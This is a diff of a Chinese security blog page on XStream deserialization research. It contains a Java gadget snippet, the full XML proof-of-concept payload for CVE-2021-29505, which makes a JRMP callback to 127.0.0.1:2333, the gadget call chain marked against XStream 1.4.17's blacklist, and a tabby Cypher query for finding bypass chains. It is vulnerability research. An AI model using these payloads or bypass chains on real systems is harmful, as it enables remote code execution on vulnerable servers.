class="hljs-variable">rdnEntry1</span> <span class="hljs-operator">=</span> ReflectionHelper.newInstance(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>, <span class="hljs-literal">null</span>);<br>ReflectionHelper.setFieldValue(rdnEntry1, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;ysomap&quot;</span>);<br>ReflectionHelper.setFieldValue(rdnEntry1, <span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;test&quot;</span>));<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry2</span> <span class="hljs-operator">=</span> ReflectionHelper.newInstance(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>, <span class="hljs-literal">null</span>);<br>ReflectionHelper.setFieldValue(rdnEntry2, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;ysomap&quot;</span>);<br>ReflectionHelper.setFieldValue(rdnEntry2, <span class="hljs-string">&quot;value&quot;</span>, multiUIDefaults);<br><br><span class="hljs-keyword">return</span> PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);<br></code></pre></td></tr></table></figure>
 <h4 id="基于XStream-1-4-16-CVE-2021-29505的探索"><a href="#基于XStream-1-4-16-CVE-2021-29505的探索" class="headerlink" title="基于XStream-1.4.16 CVE-2021-29505的探索"></a>基于XStream-1.4.16 CVE-2021-29505的探索</h4><p>先看看<strong>CVE-2021-29505</strong></p>
 <p>poc</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">parsedMessage</span>&gt;</span>true<span class="tag">&lt;/<span class="name">parsedMessage</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">soapVersion</span>&gt;</span>SOAP_11<span class="tag">&lt;/<span class="name">soapVersion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bodyParts</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">sm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">attachmentsInitialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">attachmentsInitialized</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">multiPart</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">soapPart</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mm</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">it</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">aliases</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">candidates</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">names</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">environment</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">registry</span> <span class="attr">class</span>=<span class="string">&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>UnicastRef<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">short</span>&gt;</span>0<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>false<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;/<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">registry</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">host</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">port</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">candidates</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">aliases</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">it</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">mm</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">multiPart</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">sm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221118200924654.png" alt="image-20221118200924654"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>12345<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">m__obj</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;string&#x27;</span>&gt;</span>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none<span class="hljs-tag">&lt;/<span class="hljs-name">m__obj</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>12345<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27;</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">parsedMessage</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">parsedMessage</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">soapVersion</span>&gt;</span>SOAP_11<span class="hljs-tag">&lt;/<span class="hljs-name">soapVersion</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">bodyParts</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">sm</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">attachmentsInitialized</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">attachmentsInitialized</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">multiPart</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">soapPart</span>/&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">mm</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">it</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">aliases</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">candidates</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">names</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">names</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">ctx</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">environment</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">registry</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27;</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">java.rmi.server.RemoteObject</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UnicastRef<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>127.0.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>2333<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">long</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">long</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">long</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">long</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">short</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">short</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;/<span class="hljs-name">java.rmi.server.RemoteObject</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">registry</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">host</span>&gt;</span>127.0.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">host</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span>2333<span class="hljs-tag">&lt;/<span class="hljs-name">port</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">ctx</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">candidates</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">aliases</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">it</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">mm</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">multiPart</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">sm</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221118200924654.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221118200924654.png" alt="image-20221118200924654"></p>
 <p>本质是在<code>RegistryImpl_Stub</code>反序列化，会先还原父类，调用<code>`RemoteObject#readObject</code>。其最终会有一个JRMP的连接请求产生。即source点为<code>RemoteObject#readObject()</code></p>
 <p>即简化调用链为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sun.rmi.registry.RegistryImpl_Stub#readObject</span><br><span class="line">sun.rmi.server.UnicastRef#readExternal</span><br><span class="line"># trigger rmi</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sun.rmi.registry.RegistryImpl_Stub#readObject<br>sun.rmi.server.UnicastRef#readExternal<br># trigger rmi<br></code></pre></td></tr></table></figure>
 <h4 id="XStream-1-4-17限制"><a href="#XStream-1-4-17限制" class="headerlink" title="XStream 1.4.17限制"></a>XStream 1.4.17限制</h4><ol>
 <li><p>黑名单正则</p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113034467.png" alt="image-20221119113034467"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113034467.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113034467.png" alt="image-20221119113034467"></p>
 </li>
 <li><p>黑名单</p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113204066.png" alt="image-20221119113204066"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113204066.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113204066.png" alt="image-20221119113204066"></p>
 </li>
 <li><p>黑名单继承对象</p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113227430.png" alt="image-20221119113227430"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113227430.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113227430.png" alt="image-20221119113227430"></p>
 </li>
 </ol>
 <p>CVE-2021-29505的调用链如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ldap.Rdn$RdnEntry#compareTo </span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equal </span><br><span class="line">com.sun.xml.internal.ws.api.message.Packet#toString </span><br><span class="line">com.sun.xml.internal.ws.message.saaj.SAAJMessage#copy</span><br><span class="line">com.sun.xml.internal.ws.message.saaj.SAAJMessage#getAttachments</span><br><span class="line">com.sun.xml.internal.ws.message.saaj.SAAJMessage$SAAJAttachmentSet#&lt;init&gt;</span><br><span class="line">com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#getAttachments</span><br><span class="line">com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#initializeAllAttachments</span><br><span class="line">com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#getCount</span><br><span class="line">com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parse</span><br><span class="line">com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parseAll</span><br><span class="line">com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#getAttachments</span><br><span class="line">com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#parseAll </span><br><span class="line">com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#makeProgress </span><br><span class="line">com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#hasNext </span><br><span class="line">com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#findNextCert</span><br><span class="line">com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#nextElement ==拉黑==</span><br><span class="line">com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#findNextMatch ==拉黑==</span><br><span class="line">com.sun.jndi.rmi.registry.BindingEnumeration#next </span><br><span class="line">sun.rmi.registry.RegistryImpl_Stub#lookup ==拉黑==</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">javax.naming.ldap.Rdn$RdnEntry#compareTo <br>com.sun.org.apache.xpath.internal.objects.XString#equal <br>com.sun.xml.internal.ws.api.message.Packet#toString <br>com.sun.xml.internal.ws.message.saaj.SAAJMessage#copy<br>com.sun.xml.internal.ws.message.saaj.SAAJMessage#getAttachments<br>com.sun.xml.internal.ws.message.saaj.SAAJMessage$SAAJAttachmentSet#&lt;init&gt;<br>com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#getAttachments<br>com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#initializeAllAttachments<br>com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#getCount<br>com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parse<br>com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parseAll<br>com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#getAttachments<br>com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#parseAll <br>com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#makeProgress <br>com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#hasNext <br>com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#findNextCert<br>com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#nextElement ==拉黑==<br>com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#findNextMatch ==拉黑==<br>com.sun.jndi.rmi.registry.BindingEnumeration#next <br>sun.rmi.registry.RegistryImpl_Stub#lookup ==拉黑==<br></code></pre></td></tr></table></figure>
 <p>因此，前半部分仍然是可利用的，起点即从<code>findNextCert()</code>开始找</p>
-<p><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113821197.png" alt="image-20221119113821197"></p>
+<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113821197.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113821197.png" alt="image-20221119113821197"></p>
 <p>我们可以利用<code>aliases</code>属性延续后面链子的查找。</p>
 <p>其中类需要满足的性质</p>
 <ol>
@@ -240,154 +79,31 @@
 <li>绕过所有的黑名单</li>
 </ol>
 <p>针对source点的限制实现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:&quot;nextElement&quot;&#125;)</span><br><span class="line">&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class &#123;NAME:&quot;java.util.Enumeration&quot;&#125;)</span><br><span class="line">match (source)-[:CALL]-&gt;(m1:Method)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">match (source:Method &#123;NAME:&quot;nextElement&quot;&#125;)<br>&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class &#123;NAME:&quot;java.util.Enumeration&quot;&#125;)<br>match (source)-[:CALL]-&gt;(m1:Method)<br></code></pre></td></tr></table></figure>
 <p>​    sink点，找可实现JNDI注入的</p>
